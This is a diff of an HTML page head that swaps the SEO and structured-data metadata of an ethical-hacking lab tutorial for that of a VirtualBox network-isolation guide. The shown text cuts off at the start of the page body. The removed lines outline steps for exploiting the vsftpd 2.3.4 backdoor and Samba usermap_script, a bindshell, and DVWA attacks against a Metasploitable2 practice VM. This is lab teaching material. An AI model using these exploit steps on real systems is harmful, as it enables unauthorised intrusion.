@@ -4,70 +4,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="../../../images/icon.webp" sizes="32x46" type="image/png">
-    <!-- SEO Title (59 characters) -->
-    <!-- Primary SEO Tags -->
-    <title>Set Up a Free Ethical Hacking Lab: VirtualBox + Kali Linux + Metasploitable2</title>
+    <link rel="icon" href="../../../../images/icon.webp" sizes="32x46" type="image/png">
 
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- PRIMARY SEO TAGS                                -->
+    <!-- ═══════════════════════════════════════════════ -->
+
+    <!-- SEO Title — 60 characters -->
+    <title>How to Configure VirtualBox Networks for an Isolated Hacking Lab</title>
+
+    <!-- Meta Description — 155 characters -->
     <meta name="description"
-        content="Learn how to set up a free ethical hacking lab using VirtualBox, Kali Linux, and Metasploitable2. Step-by-step guide for beginners. Practice real exploits legally.">
+        content="Learn all 6 VirtualBox network modes and configure NAT Network, Internal Network, and Host-Only topologies for a safe, isolated ethical hacking lab. Step-by-step guide.">
 
+    <!-- Keywords -->
     <meta name="keywords"
-        content="ethical hacking lab setup, Kali Linux VirtualBox, Metasploitable2 tutorial, hacking lab for beginners, penetration testing lab free, msfconsole tutorial, vsftpd exploit">
+        content="VirtualBox network modes, VirtualBox NAT Network, VirtualBox Host-Only adapter, VirtualBox Internal Network, isolated hacking lab, ethical hacking lab network setup, Kali Linux VirtualBox network, Metasploitable2 network configuration, VBoxManage CLI tutorial, penetration testing lab VirtualBox, VirtualBox network configuration beginner">
 
     <!-- Canonical URL -->
     <link rel="canonical"
-        href="https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2">
+        href="https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab">
 
-    <!-- Open Graph -->
-    <meta property="og:title" content="Set Up a Free Ethical Hacking Lab — Kali Linux + VirtualBox + Metasploitable2">
-    <meta property="og:description"
-        content="Step-by-step beginner guide to build a free, isolated ethical hacking lab using VirtualBox, Kali Linux, and Metasploitable2.">
-    <meta property="og:type" content="article">
-
-    <!-- Twitter Card -->
-    <meta name="twitter:title" content="Free Ethical Hacking Lab: Kali Linux + VirtualBox + Metasploitable2">
-    <meta name="twitter:description"
-        content="Build your own hacking lab for free. Practice real CVE exploits legally using Metasploitable2 on VirtualBox.">
-
-    <!-- Author Information -->
-    <meta name="author" content="Kumaradoss / DevspireHub">
+    <!-- Author -->
+    <meta name="author" content="Kumaradoss — DevspireHub">
     <link rel="author" href="https://devspirehub.com/about">
 
-    <!-- Twitter Card -->
+    <!-- Robots -->
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+
+    <!-- Language & Region -->
+    <meta name="language" content="en-IN">
+    <meta name="geo.region" content="IN-TN">
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- OPEN GRAPH — Facebook / LinkedIn / WhatsApp     -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="How to Configure VirtualBox Networks for an Isolated Hacking Lab">
+    <meta property="og:description"
+        content="Master all 6 VirtualBox network modes. Configure NAT Network, Internal Network, and Host-Only topologies for a safe, properly isolated ethical hacking lab with Kali Linux and Metasploitable2.">
+    <meta property="og:url"
+        content="https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab">
+    <meta property="og:image"
+        content="https://devspirehub.com/Ethical-Hacking/tutorials/images/configure-virtualbox-networks-for-isolated-hacking-lab.webp">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="How to Configure VirtualBox Networks for an Isolated Hacking Lab">
+    <meta property="og:site_name" content="DevspireHub">
+    <meta property="og:locale" content="en_IN">
+    <meta property="article:author" content="https://www.linkedin.com/in/kumaradoss-s">
+    <meta property="article:published_time" content="2026-03-21">
+    <meta property="article:modified_time" content="2026-03-21">
+    <meta property="article:section" content="Ethical Hacking">
+    <meta property="article:tag" content="VirtualBox Network Modes">
+    <meta property="article:tag" content="Ethical Hacking Lab">
+    <meta property="article:tag" content="NAT Network VirtualBox">
+    <meta property="article:tag" content="Kali Linux Network Setup">
+    <meta property="article:tag" content="Penetration Testing Lab">
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- TWITTER CARD                                    -->
+    <!-- ═══════════════════════════════════════════════ -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Linux Server Setup Guide - Ubuntu Tutorial">
+    <meta name="twitter:title" content="How to Configure VirtualBox Networks for an Isolated Hacking Lab">
     <meta name="twitter:description"
-        content="Master Ubuntu server administration with this beginner-friendly, step-by-step tutorial covering SSH, Apache, MySQL, and security.">
+        content="All 6 VirtualBox network modes explained. Configure NAT Network, Internal Network, and Host-Only for a properly isolated Kali Linux + Metasploitable2 hacking lab.">
+    <meta name="twitter:image"
+        content="https://devspirehub.com/Ethical-Hacking/tutorials/images/configure-virtualbox-networks-for-isolated-hacking-lab.webp">
+    <meta name="twitter:image:alt" content="VirtualBox Network Configuration Guide for Isolated Hacking Lab">
+    <meta name="twitter:site" content="@devspirehub">
+    <meta name="twitter:creator" content="@kumaradoss">
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- PERFORMANCE OPTIMIZATION                        -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="../../../../Linux/prism/prism.css">
+    <link rel="stylesheet" href="style.css">
 
     <script type="application/ld+json">
     {
       "@context": "https://schema.org",
       "@type": "TechArticle",
-      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2",
-      "headline": "How to Set Up a Personal Ethical Hacking Lab with VirtualBox, Kali Linux & Metasploitable2 — Free",
-      "description": "Learn how to set up a free ethical hacking lab using VirtualBox, Kali Linux, and Metasploitable2. Step-by-step guide for beginners. Practice real exploits legally.",
-      "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2",
-      "datePublished": "2026-03-14",
-      "dateModified": "2026-03-14",
+      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab#article",
+      "headline": "How to Configure VirtualBox Networks for an Isolated Hacking Lab",
+      "description": "A complete step-by-step guide to all 6 VirtualBox network modes — NAT, NAT Network, Host-Only, Internal Network, Bridged, and Not Attached. Includes three lab topologies, dual-adapter Kali setup, port forwarding, VBoxManage CLI cheat sheet, and a full troubleshooting guide for an isolated ethical hacking lab.",
+      "url": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab",
+      "datePublished": "2026-03-21",
+      "dateModified": "2026-03-21",
       "inLanguage": "en-IN",
       "articleSection": "Ethical Hacking",
-      "proficiencyLevel": "Beginner",
+      "proficiencyLevel": "Beginner to Intermediate",
+      "dependencies": "VirtualBox 7.x, Kali Linux VM, Metasploitable2 VM",
       "keywords": [
-        "ethical hacking lab setup",
-        "Kali Linux VirtualBox",
-        "Metasploitable2 tutorial",
-        "hacking lab for beginners",
-        "penetration testing lab free",
-        "msfconsole tutorial",
-        "vsftpd exploit",
-        "CVE-2011-2523",
-        "nmap reconnaissance",
-        "DVWA tutorial"
+        "VirtualBox network modes",
+        "VirtualBox NAT Network tutorial",
+        "VirtualBox Host-Only adapter",
+        "VirtualBox Internal Network",
+        "isolated hacking lab network",
+        "Kali Linux VirtualBox network configuration",
+        "Metasploitable2 network setup",
+        "VBoxManage CLI commands",
+        "ethical hacking lab VirtualBox",
+        "penetration testing lab network"
       ],
       "image": {
         "@type": "ImageObject",
-        "url": "https://devspirehub.com/Ethical-Hacking/tutorials/images/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2.webp",
+        "url": "https://devspirehub.com/Ethical-Hacking/tutorials/images/configure-virtualbox-networks-for-isolated-hacking-lab.webp",
         "width": 1200,
         "height": 630
       },
@@ -93,68 +139,20 @@
       },
       "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2"
+        "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab"
       },
-      "dependencies": "VirtualBox 7.x, Kali Linux VM, Metasploitable2, 8GB RAM minimum",
       "about": [
-        {
-          "@type": "Thing",
-          "name": "Kali Linux",
-          "sameAs": "https://en.wikipedia.org/wiki/Kali_Linux"
-        },
-        {
-          "@type": "Thing",
-          "name": "Metasploit Framework",
-          "sameAs": "https://en.wikipedia.org/wiki/Metasploit_Project"
-        },
-        {
-          "@type": "Thing",
-          "name": "Ethical Hacking",
-          "sameAs": "https://en.wikipedia.org/wiki/White-hat_hacker"
-        },
-        {
-          "@type": "Thing",
-          "name": "VirtualBox",
-          "sameAs": "https://en.wikipedia.org/wiki/VirtualBox"
-        }
+        { "@type": "Thing", "name": "VirtualBox", "sameAs": "https://en.wikipedia.org/wiki/VirtualBox" },
+        { "@type": "Thing", "name": "Kali Linux", "sameAs": "https://en.wikipedia.org/wiki/Kali_Linux" },
+        { "@type": "Thing", "name": "Network Address Translation", "sameAs": "https://en.wikipedia.org/wiki/Network_address_translation" },
+        { "@type": "Thing", "name": "Ethical Hacking", "sameAs": "https://en.wikipedia.org/wiki/White-hat_hacker" }
       ],
       "mentions": [
-        {
-          "@type": "SoftwareApplication",
-          "name": "VirtualBox",
-          "operatingSystem": "Windows, macOS, Linux",
-          "applicationCategory": "Virtualization Software"
-        },
-        {
-          "@type": "SoftwareApplication",
-          "name": "Kali Linux",
-          "operatingSystem": "Linux",
-          "applicationCategory": "Security / Penetration Testing OS"
-        },
-        {
-          "@type": "SoftwareApplication",
-          "name": "Metasploitable2",
-          "operatingSystem": "Linux",
-          "applicationCategory": "Vulnerable Practice Target VM"
-        },
-        {
-          "@type": "SoftwareApplication",
-          "name": "Metasploit Framework",
-          "operatingSystem": "Linux",
-          "applicationCategory": "Penetration Testing Framework"
-        },
-        {
-          "@type": "SoftwareApplication",
-          "name": "Nmap",
-          "operatingSystem": "Linux",
-          "applicationCategory": "Network Scanner"
-        },
-        {
-          "@type": "SoftwareApplication",
-          "name": "DVWA",
-          "operatingSystem": "Linux",
-          "applicationCategory": "Vulnerable Web Application"
-        }
+        { "@type": "SoftwareApplication", "name": "VirtualBox", "operatingSystem": "Windows, macOS, Linux", "applicationCategory": "Virtualization Software" },
+        { "@type": "SoftwareApplication", "name": "Kali Linux", "operatingSystem": "Linux", "applicationCategory": "Security / Penetration Testing OS" },
+        { "@type": "SoftwareApplication", "name": "Metasploitable2", "operatingSystem": "Linux", "applicationCategory": "Vulnerable Practice Target VM" },
+        { "@type": "SoftwareApplication", "name": "VBoxManage", "operatingSystem": "Windows, macOS, Linux", "applicationCategory": "CLI Management Tool" },
+        { "@type": "SoftwareApplication", "name": "Nmap", "operatingSystem": "Linux", "applicationCategory": "Network Scanner" }
       ]
     }
     </script>
@@ -163,90 +161,69 @@
     {
       "@context": "https://schema.org",
       "@type": "HowTo",
-      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2",
-      "name": "How to Set Up a Free Ethical Hacking Lab with VirtualBox, Kali Linux & Metasploitable2",
-      "description": "Step-by-step guide to build a fully isolated, free ethical hacking lab on your own computer using VirtualBox, Kali Linux, and Metasploitable2.",
-      "totalTime": "PT3H",
+      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab#howto",
+      "name": "How to Configure VirtualBox Networks for an Isolated Hacking Lab",
+      "description": "Step-by-step guide to configure VirtualBox NAT Network, Internal Network, and Host-Only topologies for an isolated ethical hacking lab using Kali Linux and Metasploitable2.",
+      "totalTime": "PT25M",
       "estimatedCost": {
         "@type": "MonetaryAmount",
         "currency": "INR",
         "value": "0"
       },
       "supply": [
-        { "@type": "HowToSupply", "name": "VirtualBox 7.x — free from virtualbox.org" },
-        { "@type": "HowToSupply", "name": "Kali Linux VM image — free from kali.org" },
-        { "@type": "HowToSupply", "name": "Metasploitable2 ZIP — free from SourceForge" },
-        { "@type": "HowToSupply", "name": "VirtualBox Extension Pack" },
-        { "@type": "HowToSupply", "name": "Computer with 8GB RAM minimum, 40GB free disk" }
+        { "@type": "HowToSupply", "name": "VirtualBox 7.x installed" },
+        { "@type": "HowToSupply", "name": "Kali Linux VM imported in VirtualBox" },
+        { "@type": "HowToSupply", "name": "Metasploitable2 VM imported in VirtualBox" },
+        { "@type": "HowToSupply", "name": "Computer with 8GB RAM minimum" }
       ],
       "tool": [
-        { "@type": "HowToTool", "name": "VirtualBox Hypervisor" },
+        { "@type": "HowToTool", "name": "VirtualBox GUI" },
+        { "@type": "HowToTool", "name": "VBoxManage CLI" },
         { "@type": "HowToTool", "name": "Kali Linux Terminal" },
-        { "@type": "HowToTool", "name": "Nmap Network Scanner" },
-        { "@type": "HowToTool", "name": "Metasploit Framework (msfconsole)" },
-        { "@type": "HowToTool", "name": "Netcat (nc)" },
-        { "@type": "HowToTool", "name": "Firefox Browser (for DVWA)" }
+        { "@type": "HowToTool", "name": "nmcli / ip / ifconfig commands" }
       ],
       "step": [
         {
           "@type": "HowToStep",
           "position": 1,
-          "name": "Install VirtualBox",
-          "text": "Download VirtualBox 7.x from virtualbox.org and install it on Windows, macOS, or Linux. Also install the VirtualBox Extension Pack for USB and RDP support."
+          "name": "Understand All 6 VirtualBox Network Modes",
+          "text": "Learn the difference between NAT, NAT Network, Host-Only, Internal Network, Bridged, and Not Attached. NAT gives internet per VM but blocks VM-to-VM traffic. NAT Network shares one router across all VMs. Internal Network is the most isolated — no host, no internet, VMs only."
         },
         {
           "@type": "HowToStep",
           "position": 2,
-          "name": "Import Kali Linux VM",
-          "text": "Download the Kali Linux VirtualBox image (.ova or .7z) from kali.org. Import it via File → Import Appliance in VirtualBox. Set RAM to 4096MB and 2 CPUs."
+          "name": "Topology 1 — Configure NAT Network (Recommended)",
+          "text": "Create a NAT Network named HackLab (10.10.10.0/24) via VirtualBox File > Preferences > Network. Assign both Kali and Metasploitable2 to HackLab on Adapter 1. Add a second Adapter (plain NAT) to Kali only for internet access."
         },
         {
           "@type": "HowToStep",
           "position": 3,
-          "name": "Import Metasploitable2",
-          "text": "Download Metasploitable2 ZIP from SourceForge. Create a new VM in VirtualBox, attach the Metasploitable.vmdk disk file, and set RAM to 1024MB."
+          "name": "Topology 2 — Configure Internal Network (Maximum Isolation)",
+          "text": "Set both VMs to Internal Network named IsolatedLab. Manually assign static IPs: Kali at 10.20.20.10/24, Metasploitable2 at 10.20.20.20/24. Add optional Adapter 2 NAT to Kali for internet. Metasploitable2 has zero internet access."
         },
         {
           "@type": "HowToStep",
           "position": 4,
-          "name": "Configure Host-Only Network",
-          "text": "Create a Host-Only network adapter in VirtualBox (192.168.56.0/24). Attach both Kali Linux and Metasploitable2 to this same adapter to isolate them from the internet."
+          "name": "Topology 3 — Configure Host-Only + NAT (SSH from Host)",
+          "text": "Create a Host-Only network (vboxnet0, 192.168.56.0/24) in VirtualBox. Assign Kali Adapter 1 to vboxnet0 and Adapter 2 to NAT. SSH into Kali from your host terminal using ssh kali@192.168.56.101."
         },
         {
           "@type": "HowToStep",
           "position": 5,
-          "name": "Verify Network Connectivity",
-          "text": "Boot both VMs. Get Metasploitable2 IP with ifconfig. From Kali, run ping -c 4 192.168.56.102 to confirm both VMs can communicate. Verify no internet access from Metasploitable2."
+          "name": "Configure Dual-Adapter Kali Setup",
+          "text": "Run VBoxManage modifyvm 'Kali Linux' --nic1 natnetwork --nat-network1 HackLab and --nic2 nat. Verify inside Kali with ip addr show — eth0 should show 10.10.10.x (lab) and eth1 should show 10.0.2.15 (internet). Run sudo dhclient eth1 if eth1 has no IP."
         },
         {
           "@type": "HowToStep",
           "position": 6,
-          "name": "Run Nmap Reconnaissance Scan",
-          "text": "From Kali terminal, run nmap -sV 192.168.56.102 to identify all open ports and service versions on Metasploitable2. Save results with -oN flag."
+          "name": "Set Up Port Forwarding for Host Access",
+          "text": "Use VBoxManage natnetwork modify --netname HackLab --port-forward-4 to forward host port 2222 to Kali SSH port 22, and host port 8080 to Metasploitable HTTP port 80. Access from host with ssh -p 2222 kali@127.0.0.1."
         },
         {
           "@type": "HowToStep",
           "position": 7,
-          "name": "Exploit vsftpd 2.3.4 Backdoor",
-          "text": "Open msfconsole on Kali. Use exploit/unix/ftp/vsftpd_234_backdoor, set RHOSTS to Metasploitable2 IP, and run. Obtain a root shell via CVE-2011-2523."
-        },
-        {
-          "@type": "HowToStep",
-          "position": 8,
-          "name": "Practice Bonus Exploits",
-          "text": "Practice Samba usermap_script (CVE-2007-2447) via port 445, MySQL unauthenticated root login on port 3306, and the open bindshell on port 1524."
-        },
-        {
-          "@type": "HowToStep",
-          "position": 9,
-          "name": "Access DVWA for Web Vulnerability Practice",
-          "text": "Open Firefox in Kali and navigate to http://192.168.56.102/dvwa. Login with admin/password. Practice SQL Injection, XSS, Command Injection, LFI, CSRF, and Brute Force attacks."
-        },
-        {
-          "@type": "HowToStep",
-          "position": 10,
-          "name": "Write Your First Penetration Test Report",
-          "text": "Document all findings with CVE references, CVSS scores, proof of exploitation (screenshots), and remediation recommendations. This builds your professional portfolio."
+          "name": "Verify Connectivity and Run Security Checklist",
+          "text": "From Kali, ping the Metasploitable IP, ping 8.8.8.8 for internet, and test DNS. From Metasploitable, verify ping to 8.8.8.8 FAILS (isolation confirmed). Ensure no Metasploitable adapter is set to Bridged. Take a VirtualBox snapshot."
         }
       ]
     }
@@ -256,54 +233,54 @@
     {
       "@context": "https://schema.org",
       "@type": "FAQPage",
-      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2",
+      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab#faq",
       "mainEntity": [
         {
           "@type": "Question",
-          "name": "Is it legal to practice hacking on Metasploitable2?",
+          "name": "Why can't my Kali Linux VM ping Metasploitable2 in VirtualBox?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "Yes, completely legal. Metasploitable2 is an intentionally vulnerable VM that you own and run on your own computer inside an isolated VirtualBox network. You are not attacking any real system. This setup is used by security professionals, CEH candidates, and OSCP aspirants worldwide for legal practice."
+            "text": "Both VMs are likely on the default NAT mode. In default NAT, each VM gets its own completely separate virtual router — they cannot communicate with each other even though they look identically configured. Switch both VMs to the same NAT Network (e.g., HackLab) under VM Settings > Network > Adapter 1 > Attached to: NAT Network."
           }
         },
         {
           "@type": "Question",
-          "name": "What are the minimum system requirements for this hacking lab?",
+          "name": "What is the difference between NAT and NAT Network in VirtualBox?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "Minimum: 8GB RAM, 40GB free disk space, dual-core CPU with Intel VT-x or AMD-V virtualisation enabled, Windows 10/11, macOS 12+, or Ubuntu 20.04+. Recommended: 16GB RAM, 60GB SSD, quad-core CPU."
+            "text": "Default NAT gives each VM its own isolated virtual router — VMs on NAT cannot communicate with each other. NAT Network is a shared virtual router that all VMs join, enabling VM-to-VM communication while still sharing a single internet connection through the host. For a hacking lab with Kali and Metasploitable2, always use NAT Network, not default NAT."
           }
         },
         {
           "@type": "Question",
-          "name": "How much does this ethical hacking lab cost?",
+          "name": "Is it safe to use Bridged mode for Metasploitable2?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "Completely free. VirtualBox, Kali Linux, and Metasploitable2 are all free and open-source tools. No subscription, no account, no credit card required."
+            "text": "No. Never use Bridged mode for Metasploitable2 or any intentionally vulnerable VM. Bridged mode connects the VM directly to your physical network card, giving it a real IP on your LAN. Every device on your home Wi-Fi — phones, laptops, smart TVs — can then reach and exploit the vulnerable services on Metasploitable2."
           }
         },
         {
           "@type": "Question",
-          "name": "What is the vsftpd 2.3.4 backdoor vulnerability?",
+          "name": "What VirtualBox network mode gives maximum isolation for malware analysis?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "CVE-2011-2523. In 2011, a malicious backdoor was secretly inserted into the vsftpd 2.3.4 source code. When a username containing ':)' is sent to port 21, the server opens a root shell listener on port 6200. Connecting to port 6200 gives unauthenticated root access. It is the classic first exploit taught in Metasploit training."
+            "text": "Internal Network mode provides maximum isolation. VMs on Internal Network can only communicate with other VMs on the same named network — the host cannot see them, there is no internet, and no LAN exposure. You must assign static IPs manually since there is no built-in DHCP. Use VBoxManage modifyvm VM --nic1 intnet --intnet1 IsolatedLab for both VMs."
           }
         },
         {
           "@type": "Question",
-          "name": "What is DVWA and why is it used for ethical hacking practice?",
+          "name": "How do I SSH into Kali Linux from my host terminal using VirtualBox?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "DVWA (Damn Vulnerable Web Application) is a deliberately insecure PHP web application for practising web security attacks legally. It is pre-installed on Metasploitable2 at port 80 and includes SQL Injection, XSS, CSRF, Command Injection, File Inclusion, and Brute Force vulnerabilities at adjustable difficulty levels."
+            "text": "Create a Host-Only network (vboxnet0 on Linux/Mac, or VirtualBox Host-Only Ethernet Adapter on Windows) in VirtualBox File > Host Network Manager. Set Kali Adapter 1 to Host-Only (vboxnet0) and Adapter 2 to NAT for internet. Kali gets a 192.168.56.x IP via DHCP. From your host terminal run: ssh kali@192.168.56.101"
           }
         },
         {
           "@type": "Question",
-          "name": "What is the difference between this lab and TryHackMe?",
+          "name": "How do I give Kali internet access while keeping Metasploitable2 isolated?",
           "acceptedAnswer": {
             "@type": "Answer",
-            "text": "This local lab is free forever, works fully offline, and gives you complete control over both attacker and target machines. TryHackMe requires an internet connection and a monthly subscription (₹800–2,000/month) for full access. This lab is best for first-time setup and learning real CVE exploitation, while TryHackMe offers structured guided challenges."
+            "text": "Use a dual-adapter setup on Kali only. Adapter 1: set to NAT Network (HackLab) for lab communication with Metasploitable2. Adapter 2: set to plain NAT for internet access. Do not add any internet adapter to Metasploitable2. This way Kali can update tools and browse, while Metasploitable2 has zero outbound internet access."
           }
         }
       ]
@@ -314,7 +291,7 @@
     {
       "@context": "https://schema.org",
       "@type": "BreadcrumbList",
-      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2",
+      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab#breadcrumb",
       "itemListElement": [
         {
           "@type": "ListItem",
@@ -337,8 +314,8 @@
         {
           "@type": "ListItem",
           "position": 4,
-          "name": "Set Up Ethical Hacking Lab — VirtualBox + Kali Linux + Metasploitable2",
-          "item": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2"
+          "name": "Configure VirtualBox Networks for Isolated Hacking Lab",
+          "item": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab"
         }
       ]
     }
@@ -348,34 +325,33 @@
     {
       "@context": "https://schema.org",
       "@type": "LearningResource",
-      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2",
-      "name": "Set Up a Free Ethical Hacking Lab — VirtualBox + Kali Linux + Metasploitable2",
-      "description": "A complete beginner guide to building a free, isolated ethical hacking lab. Covers VirtualBox setup, Kali Linux import, Metasploitable2 configuration, Nmap scanning, Metasploit exploitation, DVWA web vulnerability practice, and penetration test report writing.",
-      "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2",
+      "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab#learning",
+      "name": "How to Configure VirtualBox Networks for an Isolated Hacking Lab",
+      "description": "Complete guide to all 6 VirtualBox network modes with three ready-to-use lab topologies, dual-adapter Kali setup, port forwarding, VBoxManage CLI cheat sheet, troubleshooting guide, and security checklist.",
+      "url": "https://devspirehub.com/Ethical-Hacking/tutorials/configure-virtualbox-networks-for-isolated-hacking-lab",
       "learningResourceType": "Tutorial",
-      "educationalLevel": "Beginner",
+      "educationalLevel": "Beginner to Intermediate",
       "interactivityType": "active",
       "isAccessibleForFree": true,
       "inLanguage": "en-IN",
-      "timeRequired": "PT3H",
+      "timeRequired": "PT25M",
       "teaches": [
-        "Install and configure VirtualBox on Windows, macOS, and Linux",
-        "Import Kali Linux VM without ISO installation",
-        "Set up Metasploitable2 as a vulnerable practice target",
-        "Configure an isolated Host-Only network in VirtualBox",
-        "Perform Nmap reconnaissance and service version detection",
-        "Exploit vsftpd 2.3.4 backdoor using Metasploit (CVE-2011-2523)",
-        "Exploit Samba usermap_script vulnerability (CVE-2007-2447)",
-        "Access MySQL with no root password misconfiguration",
-        "Connect to an open bindshell on port 1524",
-        "Practice web vulnerabilities using DVWA",
-        "Write a professional penetration test report"
+        "All 6 VirtualBox network modes — NAT, NAT Network, Host-Only, Internal Network, Bridged, Not Attached",
+        "Configure NAT Network (HackLab) for Kali + Metasploitable2 lab",
+        "Configure Internal Network for fully air-gapped isolation",
+        "Configure Host-Only + NAT for SSH access from host terminal",
+        "Dual-adapter Kali setup — lab interface and internet simultaneously",
+        "Port forwarding via VBoxManage CLI for host browser/terminal access",
+        "Assign static IPs for Internal Network topology",
+        "Full VBoxManage CLI cheat sheet for scripted lab management",
+        "Troubleshoot common VM connectivity failures",
+        "Security checklist to prevent Metasploitable2 LAN exposure"
       ],
       "educationalUse": "Self Study",
       "audience": {
         "@type": "EducationalAudience",
         "educationalRole": "student",
-        "audienceType": "Ethical Hacking Beginners, CEH Aspirants, OSCP Students, Cybersecurity Students, Penetration Testers"
+        "audienceType": "Ethical Hacking Beginners, CEH Aspirants, OSCP Students, Penetration Testers, Cybersecurity Students"
       },
       "provider": {
         "@type": "Organization",
@@ -384,8 +360,8 @@
       },
       "isPartOf": {
         "@type": "Course",
-        "name": "Ethical Hacking for Beginners",
-        "url": "https://devspirehub.com/Ethical-Hacking",
+        "name": "Ethical Hacking Lab Setup Series",
+        "url": "https://devspirehub.com/Ethical-Hacking/tutorials",
         "provider": {
           "@type": "Organization",
           "name": "DevspireHub",
@@ -442,6 +418,64 @@
         }
     </script>
 
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "DevspireHub",
+      "url": "https://devspirehub.com",
+      "logo": "https://devspirehub.com/images/icon.webp",
+      "description": "DevspireHub — Step-by-step tutorials on Ethical Hacking, Linux, Networking, Web Development, Cloud Computing, and IT Fundamentals.",
+      "founder": {
+        "@type": "Person",
+        "name": "Kumaradoss",
+        "url": "https://www.linkedin.com/in/kumaradoss-s"
+      },
+      "sameAs": [
+        "https://www.linkedin.com/in/kumaradoss-s",
+        "https://github.com/kumaradoss16",
+        "https://www.instagram.com/devspirehub"
+      ]
+    }
+    </script>
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebSite",
+      "@id": "https://devspirehub.com/#website",
+      "url": "https://devspirehub.com",
+      "name": "DevspireHub",
+      "description": "Step-by-step tutorials on Ethical Hacking, Linux, Networking, Web Development, Cloud Computing, and IT Fundamentals.",
+      "inLanguage": "en-IN",
+      "publisher": {
+        "@type": "Organization",
+        "name": "DevspireHub",
+        "url": "https://devspirehub.com"
+      },
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": {
+          "@type": "EntryPoint",
+          "urlTemplate": "https://devspirehub.com?s={search_term_string}"
+        },
+        "query-input": "required name=search_term_string"
+      }
+    }
+    </script>
+
+
+    <!-- Google Tag Manager -->
+    <script>(function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-M457RGDF');</script>
+    <!-- End Google Tag Manager -->
+
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2368356039533778"
         crossorigin="anonymous"></script>
 
@@ -471,6 +505,11 @@
 </head>
 
 <body>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M457RGDF" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
     <amp-auto-ads type="adsense" data-ad-client="ca-pub-2368356039533778">
     </amp-auto-ads>
     <!-- Header  -->
@@ -508,1666 +547,1328 @@
             <!-- Course Header Card  -->
             <div class="card">
                 <div class="content">
-                    <h1>How to Set Up a Personal Hacking Lab with VirtualBox, Kali Linux & Metasploitable2 (Free)
+                    <h1>How to Configure VirtualBox networks for Secure Cybersecurity Lab (Step-by-Step Guide)
                     </h1>
-                    <p class="keywords"><strong>Keywords:</strong> ethical hacking lab setup | VirtualBox Kali Linux
-                        Metasploitable2 |
-                        hacking lab for beginners | free
